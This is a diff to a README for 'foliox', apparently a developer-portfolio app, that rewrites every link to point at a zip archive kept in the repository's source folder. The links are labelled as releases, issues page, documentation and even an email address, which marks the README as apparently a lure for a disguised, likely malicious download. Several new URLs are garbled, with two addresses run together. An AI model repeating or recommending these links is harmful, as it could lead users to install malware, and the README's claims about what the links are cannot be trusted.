@@ -8,7 +8,7 @@ Welcome to foliox! This application lets you build a beautiful developer portfol
 
 To get started, you first need to download the application. Click the link below to visit the Releases page:
 
-[![Download foliox](https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip%20foliox-v1.0-brightgreen)](https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip)
+[![Download foliox](https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip%20foliox-v1.0-brightgreen)](https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip)
 
 Once on the Releases page, choose the latest version and follow these simple steps:
 
@@ -49,18 +49,18 @@ Before installing foliox, ensure your system meets the following requirements:
 
 ## 🛡️ Support and Issues
 
-If you encounter any issues while using foliox, please visit our [Issues page](https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip). Here you can submit problems, request features, or suggest improvements. 
+If you encounter any issues while using foliox, please visit our [Issues page](https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip). Here you can submit problems, request features, or suggest improvements. 
 
 ## 📖 Documentation
 
-For additional guidance, refer to our comprehensive [Documentation](https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip). This resource includes helpful articles on advanced features, troubleshooting, and tips for maximizing your portfolio’s impact.
+For additional guidance, refer to our comprehensive [Documentation](https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip). This resource includes helpful articles on advanced features, troubleshooting, and tips for maximizing your portfolio’s impact.
 
 ## 📞 Contact
 
 If you need further assistance, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip
+- **Email:** https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip
 
 ---
 
-By following these steps, you will have your portfolio up and running in no time. Don't forget to check the [Releases page](https://raw.githubusercontent.com/Coincicada/foliox/main/app/(portfolio)/[username]/foliox_v3.7.zip) again in the future for updates or new features. Happy showcasing!
+By following these steps, you will have your portfolio up and running in no time. Don't forget to check the [Releases page](https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip(portfolio)/[username]https://github.com/Coincicada/foliox/raw/refs/heads/main/components/portfolio/Software-3.7.zip) again in the future for updates or new features. Happy showcasing!
